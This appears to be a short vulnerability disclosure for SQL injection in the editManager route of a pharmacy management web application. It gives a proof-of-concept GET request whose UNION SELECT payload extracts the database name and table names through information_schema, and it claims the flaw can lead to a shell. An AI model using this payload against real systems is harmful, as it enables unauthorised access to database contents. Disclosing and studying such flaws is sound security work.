## editManager

**Description of the vulnerability**
pharmacy_Management_System latest version has SQL injection, which can get information about the database and even GetShell via SQL injection

**Vulnerability recurrence**

We need to set up this PMS website locally

Let's open the  /Index.php?id=allManager  route

![image-20240723105418419](https://github.com/user-attachments/assets/9359ef86-5bb9-4730-bd15-7ecbf32f26d8)

POC

```
GET /index.php?action=editManager&id=8}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

![image-20240723125248656](https://github.com/user-attachments/assets/edc9750b-ea32-4cf4-ba79-2c41bee9489f)

Result：We can get the database name, table name, etc

![image-20240723125309098](https://github.com/user-attachments/assets/617cda8d-7660-4b28-a2a6-36140619efd5)

![image-20240723134203341](https://github.com/user-attachments/assets/4c993301-d368-4c47-8e7c-dd6e6ffde161)

Analysis code

![image-20240723130427914](https://github.com/user-attachments/assets/5874c4b2-2d35-4165-8686-42c072360eea)
